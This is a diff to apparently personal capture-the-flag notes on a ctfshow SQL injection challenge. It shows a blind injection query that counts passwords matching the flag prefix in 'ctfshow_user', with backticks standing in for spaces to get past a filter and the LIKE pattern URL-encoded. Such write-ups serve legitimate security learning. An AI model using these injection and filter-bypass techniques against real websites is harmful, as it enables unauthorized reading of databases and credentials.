@@ -503,6 +503,9 @@ The following result indicates that the table 'ctfshow_user' exists:
 ![[Pasted image 20250205105651.png]]
 The key we query is not 'username' but 'pass' as password column name:
 ```SQL
-select count(pass) from `ctfshow_user`where`pass`like%ctfshow{%
+select count(pass) from `ctfshow_user`where`pass`like'%ctfshow{%'
 ```
-We can't use spaces so we use a pair of anti-quotes to replace 2 spaces.
+- We can't use spaces so we use a pair of anti-quotes to replace 2 spaces.
+- Before execute the hack bar, we need to URL encode the `'%ctfshow{%'` to `'%25ctfshow%7B%25'`.
+![[Pasted image 20250205111501.png]]
+Yes, there is 1 pass including `ctfshow{` in its own string.
